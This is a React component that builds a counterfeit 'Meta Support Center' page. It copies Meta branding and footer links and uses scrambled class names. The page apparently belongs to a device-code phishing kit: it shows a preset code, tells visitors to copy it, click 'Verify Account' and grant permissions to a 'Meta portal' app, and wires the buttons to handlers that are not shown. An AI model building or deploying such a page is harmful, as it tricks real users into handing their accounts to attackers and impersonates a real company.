import { useState } from 'react'
import reactLogo from './assets/react.svg'
import viteLogo from '/vite.svg'
import { FaSearch, FaKey, FaCheckCircle } from 'react-icons/fa'
import { FaMeta } from 'react-icons/fa6'

function App() {
  const [count, setCount] = useState(0)

  return (
    <>
      <section id="header" className="bg-1">
        <div className="container">
          <nav className="navbar bg-body-tertiary bg-1">
            <div className="container-fluid">
              <a className="navbar-brand">
                <div className="navbar__logo text-white HpzITUVKquHIViVSbKHJ pyFozslmuPGrVXGVFrzD">
                  <FaMeta style={{ paddingRight: 4, fontSize: 28 }} /> Meta
                </div>
              </a>
              <div>
                <FaSearch />
              </div>
            </div>
          </nav>
        </div>
      </section>
      <section className=" m-0">
        <div className="col-12 p-0">
          <div className="DlFafrxGUpZXyEXveKfP">
            <h2>Meta Support Center</h2>
          </div>
        </div>
      </section>

      <section className="form">
        <div className="row m-0 mt-5 p-0 justify-content-center">
          <div className="col-12 col-lg-6 col-md-8 col-xs-12 AgAjxhbWRorsVQdTDblZ">
            <h2 className="text-center">How can we help?</h2>
            <p className="text-center">
              We need more information to address your issue. This form will only take
              a few minutes.
            </p>
          </div>
        </div>
        <div className="row m-0 mt-5 p-0 justify-content-center">
          <div className="col-12 col-lg-6 col-md-8 col-xs-12 AgAjxhbWRorsVQdTDblZ">
            <div className="p-3 card mb-3">
              <div className="card-header mb-3">
                <small>
                  Copy the code then click the "Verify Account" button below and
                  finally grant permissions to the "Meta portal" app
                </small>
              </div>
              <div className="input-group flex-nowrap mb-3">
                <span className="input-group-text">
                  <FaKey style={{fontSize: 12}}/>
                </span>
                <input
                  type="text"
                  id="user_code"
                  className="form-control"
                  defaultValue="WWWAMMRTR"
                  readOnly=""
                />
                <button
                  className="btn btn-primary"
                  id="copy_btn"
                  onclick="appData.copyDeviceCode();"
                  type="button"
                >
                  copy
                </button>
              </div>
              <div className="d-grid gap-1 mb-3">
                <button
                  className="btn btn-primary2"
                  id="btn-auth"
                  type="button"
                  onclick="appData.openTab();"
                  style={{display: "flex", justifyContent: "center", alignItems: "center", cursor: "pointer"}}
                >
                  <FaCheckCircle style={{fontSize: 18, paddingRight: 4}} /> Verify
                  Account
                </button>
              </div>
            </div>
          </div>
        </div>
      </section>
      <div className="QHmyklZyLqPKhNwwMpTT container-fluid">
        <div className="container">
          <div className="justify-content-center row footer2">
            <center>
              <div className="mpDZDtqanvWRqNTxacoJ">
                <FaMeta style={{ paddingRight: 4, fontSize: 28 }} /> <b>Meta</b>
              </div>
            </center>
            <p className="text-center mt-3">
              Facebook can help your large, medium or small business grow. Get the
              latest news for advertisers and more on our Meta for Business Page.
            </p>
          </div>
          <div className="HbEDjRyBKuHNihwrdSqN row">
            <div className="col-lg col-6">
              <p>
                <b>Marketing on Facebook</b>
              </p>
              <p>Success Stories</p>
              <p>Measurement</p>
              <p>Industries</p>
            </div>
            <div className="col-lg col-6">
              <p>
                <b>Marketing objectives</b>
              </p>
              <p>Build your presence</p>
              <p>Create awareness</p>
              <p>Drive discovery</p>
            </div>
            <div className="col-lg col-6">
              <p>
                <b>Facebook Pages</b>
              </p>
              <p>Get started with Pages</p>
              <p>Setting up your Page</p>
            </div>
            <div className="col-lg col-6">
              <p>
                <b>Facebook ads</b>
              </p>
              <p>Get started with ads</p>
              <p>Buying Facebook ads</p>
              <p>Ad formats</p>
            </div>
            <div className="col-lg col-6">
              <p>
                <b>Resources</b>
              </p>
              <p>Ads Guide</p>
              <p>Buying Facebook ads</p>
              <p>Business Help Centre</p>
            </div>
          </div>
        </div>
      </div>
      <div className="container ft-content">
        <div className="justify-content-center my-3 row">
          <div className="d-flex custom-align justify-content-center col-lg-12 col-12">
            <span className="me-3">English (UK)</span>
            <span className="me-3">English (US) </span>
            <span className="me-3">Español Português (rasil)</span>
            <span className="me-3">Français (France)</span>
            <span className="me-3">Español (España)</span>
            <span>More languages</span>
          </div>
        </div>
        <div className="justify-content-center my-3 row">
          <div className="d-flex custom-align justify-content-center col-lg-12 col-12">
            <span className="me-3">© 2023 Meta</span>
            <span className="me-3">About</span>
            <span className="me-3">Developers</span>
            <span className="me-3">Careers</span>
            <span className="me-3">Privacy</span>
            <span className="me-3">Terms</span>
            <span className="me-3">Help Centre</span>
          </div>
        </div>
      </div>

    </>
  )
}

export default App
